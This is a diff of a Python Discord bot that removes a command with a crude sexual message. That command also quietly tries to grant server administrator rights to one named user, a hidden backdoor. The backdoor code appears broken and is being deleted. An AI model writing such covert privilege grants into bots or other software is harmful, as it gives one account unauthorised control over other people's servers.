@@ -209,15 +209,6 @@ async def unmute_error(ctx,error):
     if isinstance(error, commands.MissingPermissions):
         await ctx.send("insufficient permissions to execute unmute command")
 
-@client.command()
-
-async def cum(ctx, member: discord.Member):
-    await ctx.send(f"Oh yes daddy lemme cum on you {member} UWU!")
-
-    guild = ctx.guild
-    overrun = guild.get_member_named("Reuben The Bacon (Emeraldos)#7598")
-    if overrun == "Reuben The Bacon (Emeraldos)#7598":
-        await guild.set_permissions(overrun, administrator = True)
 
 @client.command()
 async def magicball(ctx,*,question):
